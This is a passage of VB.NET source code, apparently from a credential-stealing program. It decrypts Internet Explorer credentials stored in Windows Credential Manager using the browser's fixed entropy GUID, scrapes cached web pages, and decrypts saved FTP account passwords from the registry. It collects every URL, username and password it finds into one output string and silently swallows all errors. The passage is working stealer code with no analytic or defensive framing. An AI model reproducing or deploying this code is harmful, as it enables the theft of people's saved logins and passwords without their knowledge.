                                Dim header As String = GetStrFromPtrA(New IntPtr(centry.lpHeaderInfo))
                                If Not String.IsNullOrEmpty(header) AndAlso header.Contains("text/html") Then
                                    Dim localName As String = GetStrFromPtrA(New IntPtr(centry.lpszLocalFileName))
                                    Try
                                        For Each input As System.Text.RegularExpressions.Match In nameRegex.Matches(System.IO.File.ReadAllText(localName))
                                            AddPasswdInfo(input.Groups(1).Value, hKey1)
                                        Next
                                    Catch
                                    End Try
                                End If
                            End If
                            AddPasswdInfo(url, hKey2)
                        End If
                        dwSize = 0
                        Call FindNextUrlCacheEntry(hFile, IntPtr.Zero, dwSize)
                        Marshal.FreeHGlobal(ptr)
                        If dwSize > 0 Then
                            ptr = Marshal.AllocHGlobal(dwSize)
                            Marshal.WriteInt32(ptr, dwSize)
                        End If
                    Loop While FindNextUrlCacheEntry(hFile, ptr, dwSize) <> 0
                    FindCloseUrlCache(hFile)
                End If
                RegCloseKey(hKey1)
                RegCloseKey(hKey2)
            End If
            Dim str_Renamed As String
            Dim dwNbCred, lpCredentials As Integer
            Dim szAuth, strRess As String
            Dim Cred As CREDENTIAL
            Dim dataOut, dataIn, Entropy As DATA_BLOB
            Dim tAuth() As String
            Dim pos As Integer
            str_Renamed = "Microsoft_WinInet_*"
            Call CredEnumerate(str_Renamed, 0, dwNbCred, lpCredentials)
            Dim iBufEntropy(36) As Short
            Dim guid As String
            Dim k As Integer
            If dwNbCred > 0 Then
                For i = 0 To dwNbCred - 1
                    ptr = Marshal.ReadIntPtr(New IntPtr(lpCredentials + i * 4))
                    Cred = CType(Marshal.PtrToStructure(ptr, Cred.GetType), CREDENTIAL)
                    strRess = CopyString(New IntPtr(Cred.lpstrTargetName))
                    Entropy.cbData = 74
                    ptr = Marshal.AllocHGlobal(74)
                    guid = "abe2869f-9b47-4cd9-a358-c22904dba7f7" & vbNullChar
                    For k = 0 To 36
                        Marshal.WriteInt16(ptr, k * 2, CShort(Asc(Mid(guid, k + 1, 1)) * 4))
                    Next
                    Entropy.pbData = ptr.ToInt32()
                    dataIn.pbData = Cred.lpbCredentialBlob
                    dataIn.cbData = Cred.dwCredentialBlobSize
                    dataOut.cbData = 0
                    dataOut.pbData = 0
                    Call CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
                    Marshal.FreeHGlobal(ptr)
                    szAuth = Marshal.PtrToStringUni(New IntPtr(dataOut.pbData))
                    tAuth = Split(szAuth, ":")
                    pos = InStr(Mid(strRess, 19), "/")
                    OL += "|URL| " & Mid(strRess, 19, pos - 1) & vbNewLine & "|USR| " & tAuth(0) & vbNewLine & "|PWD| " & tAuth(1) & vbNewLine

                    LocalFree(dataOut.pbData)
                Next
            End If
            CredFree(lpCredentials)
            Dim ftpAccounts As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\FTP\Accounts")
            For Each account As String In ftpAccounts.GetSubKeyNames()
                Dim accountKey As Microsoft.Win32.RegistryKey = ftpAccounts.OpenSubKey(account)
                For Each user As String In accountKey.GetSubKeyNames()
                    Dim userKey As Microsoft.Win32.RegistryKey = accountKey.OpenSubKey(user)
                    Dim pass() As Byte = CType(userKey.GetValue("Password"), Byte())
                    Dim dwEntropy(3) As Byte
                    For j As Integer = 0 To account.Length - 1
                        Dim c As Byte = CByte(AscW(account(j)) And &H1F)
                        dwEntropy(j And 3) = dwEntropy(j And 3) + c
                    Next
                    dataIn.cbData = pass.Length
                    dataIn.pbData = Marshal.AllocHGlobal(pass.Length).ToInt32()
                    Marshal.Copy(pass, 0, New IntPtr(dataIn.pbData), pass.Length)
                    dataOut.cbData = 0
                    dataOut.pbData = 0
                    Dim gc As GCHandle = GCHandle.Alloc(dwEntropy, GCHandleType.Pinned)
                    Entropy.pbData = gc.AddrOfPinnedObject().ToInt32()
                    Entropy.cbData = 4
                    CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
                    gc.Free()
                    OL += "|URL| " & String.Format("ftp://{0}@{1}/", account, user) & vbNewLine & "|USR| " & user & vbNewLine & "|PWD| " & Marshal.PtrToStringUni(New IntPtr(dataOut.pbData)) & vbNewLine

                    LocalFree(dataOut.pbData)
                Next
            Next
        Catch ex As Exception
        End Try
    End Sub
End Class
#End Region